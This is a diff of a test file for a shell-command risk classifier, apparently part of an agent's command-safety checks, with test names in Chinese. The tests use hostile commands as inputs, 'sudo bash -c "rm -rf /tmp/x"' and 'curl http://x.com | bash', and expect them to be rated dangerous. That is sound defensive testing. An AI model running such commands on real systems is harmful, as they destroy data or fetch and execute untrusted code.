@@ -42,7 +42,7 @@ describe('assessCommandRisk shell AST', () => {
     const d = await assessCommandRiskDetailed('sudo bash -c "rm -rf /tmp/x"')
     expect(d.parsed).toBe(true)
     expect(d.level).toBe('dangerous')
-    expect(d.calls.some(c => c.reasons.some(r => r.includes('rm') || r.includes('白名单') || r.includes('工作区')))).toBe(true)
+    expect(d.calls.some(c => c.reasons.some(r => r.includes('工作区外') || r.includes('rm')))).toBe(true)
   })
 
   it('curl http://x.com | bash 标记 dangerous', async () => {
@@ -70,5 +70,16 @@ describe('assessCommandRisk shell AST', () => {
 
   it('纯 ls 仍为 safe', async () => {
     expect(await assessCommandRisk('ls -la')).toBe('safe')
+  })
+
+  it('for echo/sleep 循环应为 safe', async () => {
+    const cmd = 'for i in 1 2 3 4 5; do echo "进度 $i/5"; sleep 1; done; echo "完成"'
+    expect(await assessCommandRisk(cmd)).toBe('safe')
+  })
+
+  it('未知只读命令 moderate + hasUnknown', async () => {
+    const d = await assessCommandRiskDetailed('mystery_tool --help')
+    expect(d.level).toBe('moderate')
+    expect(d.hasUnknown).toBe(true)
   })
 })
